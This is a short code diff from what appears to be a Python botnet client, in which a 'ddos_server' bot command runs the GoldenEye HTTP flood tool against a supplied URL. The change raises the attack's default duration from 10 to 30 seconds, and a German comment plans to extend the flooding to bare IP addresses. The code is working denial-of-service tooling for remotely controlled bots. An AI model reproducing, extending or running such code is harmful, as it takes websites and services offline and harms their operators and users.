@@ -18,13 +18,13 @@ class BotCommands(object):
         """Echos its parameters back"""
         logging.info("default_command: %s" % kwargs)
 
-    def ddos_server(self, url=None, ip=None, timeout=10):
+    def ddos_server(self, url=None, ip=None, timeout=30):
         if self.ddos_process is None or not self.ddos_process.poll():
             if self.ddos_process is not None:
                 logging.debug("goldeneye: %s" % self.ddos_process.communicate())
 
             if url:
-                logging.info("timeout %d goldeneye %s -m random "%(timeout, url))
+                logging.info("timeout -s SIGINT %d goldeneye %s -m random "%(timeout, url))
                 ddos_process = subprocess.Popen(shlex.split("timeout %d goldeneye %s -m random "%(timeout, url)))
             elif ip:
                 # TODO: DDOS eine IP
